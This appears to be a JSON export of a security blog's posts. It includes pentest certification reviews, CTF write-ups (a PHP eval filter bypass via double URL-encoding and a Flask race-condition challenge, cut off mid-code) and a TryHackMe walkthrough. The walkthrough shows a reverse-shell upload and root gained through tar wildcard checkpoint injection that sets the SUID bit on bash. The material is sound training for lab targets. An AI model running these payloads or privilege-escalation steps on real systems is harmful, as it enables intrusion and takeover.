and observe the applications. Understand how Encryption and Hashing can be performed in android applications. Understand Content Providers in android and how these can be exploited. Learn how to build mobile applications with android studio. Learn to analyse the AndroidMenifest.xml file. I wish you the best of luck on your mobile application penetration testing journey. Feel free to message me on LinkedIn if you have any queries.\n","permalink":"http://localhost:1313/posts/certification-reviews/emapt/","summary":"\u003ch1 id=\"what-is-emapt\"\u003eWhat is eMAPT?\u003c/h1\u003e\n\u003cp\u003eeLearn Mobile Application Penetration Tester (eMAPT) is a Mobile Application Penetration Testing certification by INE (formerly known as eLearnSecurity). This exam proves that certified professionals have adequate knowledge to perform Penetration Testing of mobile applications (Android and IOS) and can provide exploit application.\u003c/p\u003e\n\u003ctable\u003e\n  \u003cthead\u003e\n      \u003ctr\u003e\n          \u003cth\u003ePrice\u003c/th\u003e\n          \u003cth\u003e400$ (Without training)\u003c/th\u003e\n      \u003c/tr\u003e\n  \u003c/thead\u003e\n  \u003ctbody\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eTraining Cost\u003c/td\u003e\n          \u003ctd\u003e749$\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003ePassing score\u003c/td\u003e\n          \u003ctd\u003e(Working Android Application as POC)\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eAllowed time\u003c/td\u003e\n          \u003ctd\u003e7 days\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eProctored?\u003c/td\u003e\n          \u003ctd\u003eNo\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eLink to purchase\u003c/td\u003e\n          \u003ctd\u003e\u003ca href=\"https://security.ine.com/certifications/emapt-certification/\"\u003eHere\u003c/a\u003e\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eExam Focused Areas\u003c/td\u003e\n          \u003ctd\u003eAndroid Application Penetration Testing, Android Application Development\u003c/td\u003e\n      \u003c/tr\u003e\n  \u003c/tbody\u003e\n\u003c/table\u003e\n\u003ch1 id=\"my-experience\"\u003eMy Experience:\u003c/h1\u003e\n\u003cp\u003eI started the exam in the morning of 18th May 2024, uploaded the report on 20th May 2024 and received the result on 29th May 2024.\u003c/p\u003e","title":"eMAPT Exam Review"},{"content":"What is eCPPT? eLearn Security Certified Professional Penetration Tester (eCPPT) is a Network penetration testing certification by INE. This exam proves that certified professionals have adequate knowledge to perform Penetration Testing on the network (multiple hosts and servers) and can provide the documentation of the findings.\nPrice 400$ (Without training) Training Cost 749$ Passing score (Exploitation of all the machines and a good report) Allowed time 7 days for Pentesting and 7 days for report Proctored? No Link to purchase Here Exam Focused Areas Pivoting, Buffer Overflows My Experience: I started the eCPPT exam in the morning of 25th February 2024, uploaded report on 7th march at 1PM and got the email with subject \u0026ldquo;You are now an eCPPTv2!\u0026rdquo; on 27th March 2024.\nAs I prepared with the INE official course material, so before talking about the exam, I would like to talk about the course material.\nThe course covers all the skills needed to pass the eCPPT exam. However, I would say the course has over loaded information, which personally I skipped a lot. It is beneficial for the beginner to understand the concept but that\u0026rsquo;s going to take lot of time. In some places, you will find outdated information in the course, as the course is a little bit older (Thanks to INE that in April they will release new course material for eCPPT). So, Can we see eCPPT V3 soon?\nThe VPN Issue When I started the exam, the VPN was not working. It was giving the following error:\nReducted... failed to negotiate cipher with server Reducted... In the given openvpn configuration file:\nThe following line was there:\ncipher AES-128-CBC The above line was changed as\ndata-ciphers AES-128-CBC This fixed the issues. Further details about the issue can be found here here.\nPreparation: I started the exam on 25 February and submitted the report on 7th march 2024. It took me 12 days to submit the report, because I was also attending my university classes during this time. If you give full time to it, you may finish it earlier. I received the result after a long wait on 27 March 2024. INE has to work to reduce the exam result time. INE should also reduce the long 14 days time of the exam. The reason I have not attempted it for 1 year was lack of time, because I was always busy with work and studies that I was unable to take 15 days break from all that.\nTimeline Day1: In the first day, I was able to pwn one machine. It was very easy and I was happy and confident.\nDay2: I faced issues in setting the pivoting and proxychains during this day, and by the end of the day I was only able to verify that I set up pivoting the right way and all my tools started working again in this environment.\nDay3: I pawned the second machine fairly easily. I tried all what I can to pwn the 3rd machine but I failed, I was thinking it very complex but it was very simple, just lack of post exploitation enumeration.\nDay4: In the first half, I stuck again and at this point, I started worrying. But when I enumerated with focus then I found that I was missing a very simple thing, it was not needing anything extra. I rooted the 3rd machine and also worked on the 4rth one, which was the buffer overflow one.\nDay5: I managed to generate a working exploit for the buffer overflow machine. Note that, whenever you send a long input, the backend application will crash and buffer overflow machine will become unresponsive, you will need to reset the whole exam environment to make it responsive again, in this case make sure to use this tag while generating payload from the msfvenom EXITFUNC=thread. On the same day, I exploited the 5th and last machine as well.\nReporting It is the most important part of the exam. You will not get passing marks if you only show the ways of getting root access across all the machines, but you have to report all the vulnerabilities in each of the machine. I used TCM security report template, which I found to be more beneficial than others. My report was 130 pages long. I have not taken and saved screenshots during the exam, because I started recording using OBS at the start of the exam and saved all the recording with me. I went through all the videos later while preparing the report and took screenshot of the part in the video to add in the report.\nTips for the exam: Work on the pivoting before going to attempt the exam, it is mandatory. Practice the buffer overflows in the windows environment. Get your hands dirty on Metasploit. Specially the post exploitation and routing. Enumerate well in the post exploitation phase. Instead of making screenshot of everything, use OBS to record screen while working. You can use those recorded videos to make screen shots later while reporting. Resources: THM Wreath Room for Pivoting Home Lab setup for pivoting Buffer Overflows practice Double Pivoting Practice Pivoting with Metasploit TCM Report Template for Reporting ","permalink":"http://localhost:1313/posts/certification-reviews/ecppt/","summary":"\u003ch2 id=\"what-is-ecppt\"\u003eWhat is eCPPT?\u003c/h2\u003e\n\u003cp\u003eeLearn Security Certified Professional Penetration Tester (eCPPT) is a Network penetration testing certification by INE. This exam proves that certified professionals have adequate knowledge to perform Penetration Testing on the network (multiple hosts and servers) and can provide the documentation of the findings.\u003c/p\u003e\n\u003ctable\u003e\n  \u003cthead\u003e\n      \u003ctr\u003e\n          \u003cth\u003ePrice\u003c/th\u003e\n          \u003cth\u003e400$ (Without training)\u003c/th\u003e\n      \u003c/tr\u003e\n  \u003c/thead\u003e\n  \u003ctbody\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eTraining Cost\u003c/td\u003e\n          \u003ctd\u003e749$\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003ePassing score\u003c/td\u003e\n          \u003ctd\u003e(Exploitation of all the machines and a good report)\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eAllowed time\u003c/td\u003e\n          \u003ctd\u003e7 days for Pentesting and 7 days for report\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eProctored?\u003c/td\u003e\n          \u003ctd\u003eNo\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eLink to purchase\u003c/td\u003e\n          \u003ctd\u003e\u003ca href=\"https://security.ine.com/certifications/ecppt-certification/\"\u003eHere\u003c/a\u003e\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eExam Focused Areas\u003c/td\u003e\n          \u003ctd\u003ePivoting, Buffer Overflows\u003c/td\u003e\n      \u003c/tr\u003e\n  \u003c/tbody\u003e\n\u003c/table\u003e\n\u003ch2 id=\"my-experience\"\u003eMy Experience:\u003c/h2\u003e\n\u003cp\u003eI started the eCPPT exam in the morning of 25th February 2024, uploaded report on 7th march at 1PM and got the email with subject \u003cem\u003e\u0026ldquo;You are now an eCPPTv2!\u0026rdquo;\u003c/em\u003e on 27th March 2024.\u003c/p\u003e","title":"eCPPT Exam Review"},{"content":"In this challenge, we have to bypass two preg_match functions to get the flag.\nThe Given Code \u0026lt;?php #read flag.txt highlight_file(__FILE__); $code = $_GET[\u0026#39;cmd\u0026#39;]; $blocked_functions = \u0026#39;/(exec|shell_exec|system|`)/i\u0026#39;; if (preg_match($blocked_functions, $code)) { die(\u0026#34;Hacking attempt detected\u0026#34;); } else { $blocked_functions = \u0026#34;/flag/i\u0026#34;; if (preg_match($blocked_functions, $code)) { die(\u0026#34;Hacking attempt detected\u0026#34;); } else{ eval(urldecode($code)); } } ?\u0026gt; Initially, It highlights the code file. Then it stores the \u0026lsquo;cmd\u0026rsquo; get parameter value in code variable, it blocks all the functions through which we can execute the shell commands.\nIt also blocks the flag keyword.\nAt the end, it URL decode the code variable and run eval function on that.\nIn PHP, eval() is a function that takes a string as an argument and executes it as PHP code.\nSo initially I tried executing echo \u0026quot;hello world\u0026quot;;\nIt runs as shown below.\nOur goal is to read the flag.txt file that exists in the same directory. I tried if we can somehow read the flag.txt directly, but it is forbidden as shown below.\nNow I searched the way to read file in php, so I got to know that we can use file_get_contents() to read file in php.\nWe can the following to read flag.txt: cmd=file_get_contents('flag.txt');\nBut the issue is that, the flag word is blocked.\nAs we can see that, it decodes url before sending it to the eval function as show below.\neval(urldecode($code)); So, we can double URL encode it before sending it, so first time, our own URL will decode it and the second time the urldecode() function will decode it. So I used burp to encode it as shown below.\nWhen we double encode it: file_get_contents('flag.txt');, it will be very longer. So instead I double encoded just the g word in flag.txt.\nSo the final payload is:\ncmd=echo file_get_contents(\u0026#39;fla%25%36%37.txt\u0026#39;); So I run it, it gave me the flag.txt as show below.\nI hope you liked it. :)üòç\n","permalink":"http://localhost:1313/posts/ctf-writeups/bypass-square-web-nascon23/","summary":"\u003cp\u003eIn this challenge, we have to bypass two preg_match functions to get the flag.\u003c/p\u003e\n\u003ch4 id=\"the-given-code\"\u003eThe Given Code\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-php\" data-lang=\"php\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e\u0026lt;?\u003c/span\u003e\u003cspan class=\"nx\"\u003ephp\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#read flag.txt\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nx\"\u003ehighlight_file\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"no\"\u003e__FILE__\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003e$code\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nv\"\u003e$_GET\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;cmd\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e];\u003c/span\u003e \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003e$blocked_functions\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;/(exec|shell_exec|system|`)/i\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003epreg_match\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$blocked_functions\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nv\"\u003e$code\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003edie\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;Hacking attempt detected\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e \u003cspan class=\"k\"\u003eelse\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"nv\"\u003e$blocked_functions\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;/flag/i\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003epreg_match\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$blocked_functions\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nv\"\u003e$code\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003edie\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;Hacking attempt detected\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"p\"\u003e}\u003c/span\u003e \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"k\"\u003eelse\u003c/span\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003eeval\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eurldecode\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$code\u003c/span\u003e\u003cspan class=\"p\"\u003e));\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e?\u0026gt;\u003c/span\u003e\u003cspan class=\"err\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eInitially, It highlights the code file. Then it stores the \u0026lsquo;cmd\u0026rsquo; get parameter value in code variable, it blocks all the functions through which we can execute the shell commands.\u003c/p\u003e","title":"Bypass square -  Web - NaScon'23"},{"content":"Setup The following entry is being added to the /etc/hosts.\n10.10.57.136 cmess.thm Enumeration Nmap all ports scan is being run. The following was the result of the scan.\n‚îå‚îÄ‚îÄ(kali„âøkali)-[~/Desktop/tryhackme/cmess] ‚îî‚îÄ$ nmap 10.10.57.136 -p- --min-rate 2500 Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-31 16:44 EDT Warning: 10.10.57.136 giving up on port because retransmission cap hit (10). Nmap scan report for cmess.thm (10.10.57.136) Host is up (0.18s latency). Not shown: 65507 closed tcp ports (conn-refused), 26 filtered tcp ports (no-response) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 43.91 seconds So, port 22 and 80 are open. The version of services are being identified as shown.\n‚îå‚îÄ‚îÄ(kali„âøkali)-[~/Desktop/tryhackme/cmess] ‚îî‚îÄ$ nmap -sV -sC 10.10.57.136 -p22,80 Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-31 16:48 EDT Nmap scan report for cmess.thm (10.10.57.136) Host is up (0.18s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 d9b652d3939a3850b4233bfd210c051f (RSA) | 256 21c36e318b85228a6d72868fae64662b (ECDSA) |_ 256 5bb9757805d7ec43309617ffc6a86ced (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-generator: Gila CMS | http-robots.txt: 3 disallowed entries |_/src/ /themes/ /lib/ |_http-title: Site doesn\u0026#39;t have a title (text/html; charset=UTF-8). Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 13.65 seconds Other than Gila CMS, there\u0026rsquo;s nothing interesting.\nThe website running on port 80 is being explored and the following is the page with no interesting surface.\nThe content on port 80\nDirsearch is being run to find the directories in the target website. The following is result is being obtained.\n‚îå‚îÄ‚îÄ(kali„âøkali)-[~/Desktop/tryhackme/cmess] ‚îî‚îÄ$ dirsearch -u http://10.10.57.136 --exclude-status=401,402,403,404 [16:56:01] Starting: [16:56:15] 200 - 4KB - /0 [16:56:15] 200 - 4KB - /01 [16:56:17] 200 - 3KB - /About [16:56:21] 200 - 4KB - /Search [16:56:28] 200 - 2KB - /admin [16:56:44] 200 - 0B - /api [16:56:46] 200 - 566B - /assets/ [16:56:47] 200 - 4KB - /author [16:56:50] 200 - 4KB - /blog/ [16:56:51] 200 - 4KB - /category [16:57:05] 200 - 735B - /feed [16:57:10] 200 - 4KB - /index [16:57:13] 301 - 318B - /lib -\u0026gt; http://10.10.57.136/lib/?url=lib [16:57:15] 301 - 318B - /log -\u0026gt; http://10.10.57.136/log/?url=log [16:57:15] 200 - 2KB - /login [16:57:32] 200 - 65B - /robots.txt [16:57:33] 200 - 4KB - /search [16:57:37] 301 - 322B - /sites -\u0026gt; http://10.10.57.136/sites/?url=sites [16:57:38] 301 - 318B - /src -\u0026gt; http://10.10.57.136/src/?url=src [16:57:41] 200 - 4KB - /tag [16:57:41] 200 - 3KB - /tags [16:57:42] 301 - 324B - /themes -\u0026gt; http://10.10.57.136/themes/?url=themes [16:57:43] 301 - 318B - /tmp -\u0026gt; http://10.10.57.136/tmp/?url=tmp Task Completed The directories are being explore, but majority of the pages can be accessed after authentication. We need to find email and password to access the administrator page.\nSubdomains are being enamurated with the wfuzz tool. The result is being showed below.\n‚îå‚îÄ‚îÄ(kali„âøkali)-[~/Desktop/tryhackme/cmess] ‚îî‚îÄ$ wfuzz -c -f sub-fighter -w /usr/share/wordlists/SecLists-master/Discovery/DNS/subdomains-top1million-5000.txt -u \u0026#34;http://cmess.thm/\u0026#34; -H \u0026#34;Host: FUZZ.cmess.thm\u0026#34; --hw 290 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz\u0026#39;s documentation for more information. ******************************************************** * Wfuzz 3.1.0 - The Web Fuzzer * ******************************************************** Target: http://cmess.thm/ Total requests: 4989 ===================================================================== ID Response Lines Word Chars Payload ===================================================================== 000000019: 200 30 L 104 W 934 Ch \u0026#34;dev\u0026#34; Total time: 0 Processed Requests: 4989 Filtered Requests: 4988 Requests/sec.: 0 The dev.cmess.thm is interesting, it is being added to /etc/hosts as given below.\n10.10.57.136 dev.cmess.thm The following is the content of this sub-domain.\nGaining Access The dev page seems to be a conversation between andre and support. The password of andre is exposed here. This password is being tried to ssh into the machine but it gave me that the password is incorrect.\nSo, the credentials are being tried at the Gila CMS admin login page. It worked and the admin page is being accessed.\nHere under content\u0026gt;file manager there is an option to upload file. A php reverse shell is being upload here. There\u0026rsquo;s no restriction on file upload.\nThe uploaded file can be accessed in the cmess.thm/assets/revshell.php.\nA reverse shell is being obtained as show below:\nRev shell obtained\nPrivilege Escalation Currently, we are in the machine as www-data user. The linenum.sh is being transferred to the machine and is being run. It gave us a password backup file as shown.\nEscalated to the user andre by running su andre , followed by the found password. As the current shell is not stable, we already got the password of andre, so connected to ssh with the credentials.\nThe user andre is being accessed as shown below:\nGot user access.\nFor getting root, the machine is being explored as the user andre.\nThere is a cronjob running, which is running after each 2 minutes and using wildcard with tar, it can used for getting root.\nThe following command is being run which will create a script that will copy the shell to the temp and will enable its suid bit.\necho \u0026#39;cp /bin/bash /tmp/bash; chmod +s /tmp/bash\u0026#39; \u0026gt; /home/andre/backup/runme.sh A checkpoint file is being created in the folder that will be backed up:\ntouch /home/andre/backup/--checkpoint=1 The following command will execute the script that is copying the shell to /tmp as root.\ntouch /home/andre/backup/--checkpoint-action=exec=sh\\ runme.sh Waited 2 minutes for the script to be executed,, and run the run the copied shell with command /tmp/bash -p\nThe machine is being rooted.\nIn this way, the root access is being obtained.\nConclusion The difficulty level of the machine was medium. The machine contains exposed password of user andre which can be used to access the admin panel. The admin panel has no restriction on file upload, and the files on the server can be run directly. For the privilege escalation, the machine again has exposed password of the user andre, which can be used for accessing the adre user from www-data. The root user can obtained by abusing the cronjobs.\n","permalink":"http://localhost:1313/posts/machine-writeups/cmess-tryhackme/","summary":"\u003ch2 id=\"setup\"\u003eSetup\u003c/h2\u003e\n\u003cp\u003eThe following entry is being added to the \u003ccode\u003e/etc/hosts\u003c/code\u003e.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e10.10.57.136 cmess.thm\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"enumeration\"\u003eEnumeration\u003c/h2\u003e\n\u003cp\u003eNmap all ports scan is being run. The following was the result of the scan.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e‚îå‚îÄ‚îÄ\u003cspan class=\"o\"\u003e(\u003c/span\u003ekali„âøkali\u003cspan class=\"o\"\u003e)\u003c/span\u003e-\u003cspan class=\"o\"\u003e[\u003c/span\u003e~/Desktop/tryhackme/cmess\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e‚îî‚îÄ$ nmap 10.10.57.136 -p- --min-rate \u003cspan class=\"m\"\u003e2500\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eStarting Nmap 7.93 \u003cspan class=\"o\"\u003e(\u003c/span\u003e https://nmap.org \u003cspan class=\"o\"\u003e)\u003c/span\u003e at 2023-08-31 16:44 EDT\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eWarning: 10.10.57.136 giving up on port because retransmission cap hit \u003cspan class=\"o\"\u003e(\u003c/span\u003e10\u003cspan class=\"o\"\u003e)\u003c/span\u003e.\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eNmap scan report \u003cspan class=\"k\"\u003efor\u003c/span\u003e cmess.thm \u003cspan class=\"o\"\u003e(\u003c/span\u003e10.10.57.136\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eHost is up \u003cspan class=\"o\"\u003e(\u003c/span\u003e0.18s latency\u003cspan class=\"o\"\u003e)\u003c/span\u003e.\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eNot shown: \u003cspan class=\"m\"\u003e65507\u003c/span\u003e closed tcp ports \u003cspan class=\"o\"\u003e(\u003c/span\u003econn-refused\u003cspan class=\"o\"\u003e)\u003c/span\u003e, \u003cspan class=\"m\"\u003e26\u003c/span\u003e filtered tcp ports \u003cspan class=\"o\"\u003e(\u003c/span\u003eno-response\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ePORT   STATE SERVICE\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e22/tcp open  ssh\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e80/tcp open  http\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eNmap \u003cspan class=\"k\"\u003edone\u003c/span\u003e: \u003cspan class=\"m\"\u003e1\u003c/span\u003e IP address \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"m\"\u003e1\u003c/span\u003e host up\u003cspan class=\"o\"\u003e)\u003c/span\u003e scanned in 43.91 seconds\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eSo, port 22 and 80 are open. The version of services are being identified as shown.\u003c/p\u003e","title":"TryHackMe Cmess machine Walkthrough"},{"content":"The web security challenge was vulnerable to race condition.\nThe following was the given website.\nThe following were the user details with IDs and funds.\nthe /dump path has a comment, which reveals the source code.\nThe following part of the code was vulnerable to Race Condition. A race window exists in the if condition. We can send multiple request parallelly, it will bypass the if condition before the deduction of funds.\nThe flag can only be obtained by making the funds more than 405. Which by default are 405 and there is no other way to increase the funds.\ni sent a request to /transfer endpoint.\nI captured the request on burp, and grouped afew requests with same parameter values.\nI sent all the requests in parallel.\nI did it a few times untill it works. The following is the result after a few tries. Where made the value more than 405.\nI bought flag with user id=2.\nIt gives me the flag as shown below.\nThe full source code:\nfrom flask import Flask, render_template, request, redirect, url_for, flash import sqlite3 app = Flask(__name__) app.secret_key = \u0026#39;secretkey\u0026#39; DATABASE = \u0026#39;users.db\u0026#39; FLAG = \u0026#39;fake flag\u0026#39; def create_db(): # Create the database tables if they don\u0026#39;t exist conn = sqlite3.connect(DATABASE) cursor = conn.cursor() # Create the \u0026#39;users\u0026#39; table if it doesn\u0026#39;t exist cursor.execute(\u0026#39;\u0026#39;\u0026#39; CREATE TABLE IF NOT EXISTS users ( id INTEGER PRIMARY KEY, funds INTEGER ) \u0026#39;\u0026#39;\u0026#39;) # Insert initial data if the table is empty cursor.execute(\u0026#39;SELECT COUNT(*) FROM users\u0026#39;) count = cursor.fetchone()[0] if count == 0: cursor.execute(\u0026#39;\u0026#39;\u0026#39; INSERT INTO users (id, funds) VALUES (1, 350), (2, 55) \u0026#39;\u0026#39;\u0026#39;) conn.commit() conn.close() app.before_request_funcs = [(None, create_db())] @app.route(\u0026#39;/\u0026#39;) def index(): return render_template(\u0026#39;index.html\u0026#39;) @app.route(\u0026#39;/dump\u0026#39;) def dump_users(): try: conn = sqlite3.connect(DATABASE) cursor = conn.cursor() cursor.execute(\u0026#34;SELECT id, funds FROM users\u0026#34;) users = cursor.fetchall() return render_template(\u0026#39;dump.html\u0026#39;, users=users) except sqlite3.Error as e: flash(\u0026#39;Error: \u0026#39; + str(e), \u0026#39;error\u0026#39;) finally: conn.close() return redirect(url_for(\u0026#39;index\u0026#39;)) @app.route(\u0026#39;/reset\u0026#39;) def reset_funds(): try: conn = sqlite3.connect(DATABASE) cursor = conn.cursor() cursor.execute(\u0026#34;UPDATE users SET funds = 350 WHERE id = 1\u0026#34;) cursor.execute(\u0026#34;UPDATE users SET funds = 55 WHERE id = 2\u0026#34;) conn.commit() flash(\u0026#39;Funds updated!\u0026#39;, \u0026#39;success\u0026#39;) except sqlite3.Error as e: flash(\u0026#39;Error: \u0026#39; + str(e), \u0026#39;error\u0026#39;) finally: conn.close() return redirect(url_for(\u0026#39;index\u0026#39;)) @app.route(\u0026#39;/buy_flag\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) def buy_flag(): user_id = request.form.get(\u0026#39;user_id\u0026#39;) try: conn = 